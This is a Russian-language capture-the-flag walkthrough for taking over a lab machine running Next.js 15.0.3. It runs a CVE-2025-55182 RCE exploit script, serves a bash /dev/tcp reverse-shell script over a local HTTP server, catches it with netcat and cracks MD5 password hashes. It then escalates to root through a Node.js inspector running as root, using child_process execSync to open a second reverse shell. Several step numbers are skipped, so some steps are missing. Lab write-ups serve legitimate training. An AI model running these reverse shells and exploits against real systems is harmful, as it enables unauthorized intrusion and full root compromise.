# 1. Сканирование  'sudo nmap -Pn -sC -sV <IP машины>'

### -sC — запустить стандартные скрипты для получения дополнительной информации о сервисах
### -sV — определить версии запущенных сервисов (это критично — нам нужна точная версия)

Обнаружены два открытых порта. Порт 22 (SSH) — стандартный способ удалённого управления Linux-сервером, пока недоступен без credentials. Порт 3000 — здесь работает веб-приложение на Next.js версии 15.0.3. Версия критична: именно она определяет, какие уязвимости применимы.
   


# 2. Зная версию Next.js (15.0.3), ищем известные уязвимости.

### На ExploitDB (exploit-db.com) найдите CVE-2025-55182 — уязвимость класса Remote Code Execution (RCE) в Next.js. Она позволяет выполнять произвольные команды на сервере без аутентификации через механизм React Server Components.



#3. Откройте папку в которой вы сохранили CVE-2025-55182 и запустите
    sudo python3 CVE-2025-55182.py -t http://10.129.101.31:3000 -c "id"


Команда id — стандартная проверочная команда. Она не меняет ничего на сервере, просто показывает от чьего имени выполняется код.

Ожидаемый результат
uid=999(node) gid=988(node) groups=988(node)



4. В отдельной директории создайте echo 'bash -i >& /dev/tcp/your-IP/9001 0>&1' > s.sh


Что делает эта команда внутри s.sh?

bash -i — запустит интерактивный bash на сервере жертвы
/dev/tcp/IP/9001 — направит весь ввод/вывод bash в TCP-соединение к нашей машине на порт 9001
Результат: bash жертвы "звонит" вам и вы получаете его командную строку


В той же директории запустите свой локальный сервер который будет раздавать s.sh
sudo python3 -m http.server 80

python3 -m http.server раздаёт файлы из текущей директории. Если s.sh лежит в другой папке — сервер его не найдёт и уязвимый сервер получит ошибку 404.

Почему порт 80? команда curl http://IP/s.sh без указания порта автоматически идёт на порт 80 (стандартный HTTP). Для портов выше 1024 sudo не нужен, но порт придётся явно указывать в curl.

   
5. Откройе ещё одну консоль и запустите netcat
    sudo nc -lvnp 9001

netcat открывает порт 9001 и ждёт входящего подключения. Когда уязвимый сервер выполнит s.sh — он подключится сюда и мы получим его командную строку.

9. Вы увидете хэши паролей админа и инжинера

Хеши — это необратимые криптографические преобразования паролей. Длина 32 символа и hex-формат указывают на алгоритм MD5. Атакуем хеш engineer, а не admin — потому что в системе существует реальный Linux-пользователь engineer (мы видели это в /home/), а admin — только веб-аккаунт без системного доступа.

13. в той же консоли узнайте о сетевых соединениях
    ss -tunlp
    Вы заметите сединение 127.0.0.1:9229 это дебагер node js

Порт 9229 на localhost (127.0.0.1) — это Node.js Inspector, встроенный отладчик Node.js. Снаружи он недоступен (слушает только localhost), но мы уже внутри системы. Проверим кто его запустил
ps aux | grep node

Вывод должен быть таким
root   1291   /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

Процесс запущен от root с флагом --inspect. Это значит: если подключиться к этому отладчику и выполнить JavaScript-код — он выполнится с правами root.
    
14. Для получения доступа к дебаг-консоли введите
    node inspect 127.0.0.1:9229

    
15. У себя в новом терминале запустите nc -nlvp 9002

16. В дебаг консоли запустите
    exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ваш IP/9002 0>&1\"').toString()")


JavaScript-код выполняется внутри root-процесса. Он использует модуль child_process чтобы запустить обычную bash-команду — но от имени root, потому что сам процесс принадлежит root.



17. Если всё прошло успешно перейдите в консоль где запустили nc -nlvp 9002, вы получите доступ root
